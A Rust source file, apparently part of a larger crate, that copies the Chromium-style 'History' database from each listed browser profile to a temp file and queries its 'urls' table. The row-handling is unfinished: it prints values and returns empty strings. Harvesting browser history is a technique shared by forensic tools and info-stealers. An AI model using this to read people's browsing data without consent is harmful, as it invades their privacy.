use rusqlite::Connection;
use std::path::PathBuf;

#[allow(dead_code)]
#[derive(Debug)]
pub(super) struct HistoryEntry {
    a: String,
    b: String,
}

pub async fn get_history(
    path: &mut PathBuf,
    profiles: &Vec<String>,
    tempfile: &PathBuf,
    // ) -> std::io::Result<Vec<Vec<HistoryEntry>>> {
) -> std::io::Result<Vec<Vec<Vec<String>>>> {
    // let mut result = Vec::<Vec<HistoryEntry>>::with_capacity(profiles.len());
    let mut result = Vec::<Vec<Vec<String>>>::with_capacity(profiles.len());

    for profile in profiles {
        path.push(profile);
        path.push("History");

        super::check_db_size(path).await?;

        // Copy the file to the temporary folder
        std::fs::copy(&path, tempfile).unwrap();

        // Connect to the SQLite database
        let conn = Connection::open(tempfile).unwrap();
        let mut statement = conn.prepare("SELECT * FROM urls").unwrap();

        // Execute the command and collect the data
        let data_iter = statement
            .query_map([], |row| {
                // Ok(HistoryEntry {
                //     a: row.get::<usize, String>(0).unwrap(),
                //     b: row.get::<usize, String>(1).unwrap(),
                // })
                let mut v = Vec::new();
                println!("{:?}", row.get::<usize, String>(0));
                v.push("".to_string());
                Ok(v)
            })
            .unwrap();

        result.push(
            data_iter
                .into_iter()
                .map(|x| x.unwrap())
                // .collect::<Vec<HistoryEntry>>(),
                .collect::<Vec<Vec<String>>>(),
        );

        std::fs::remove_file(tempfile).unwrap();
        path.pop();
        path.pop();
    }

    Ok(result)
}
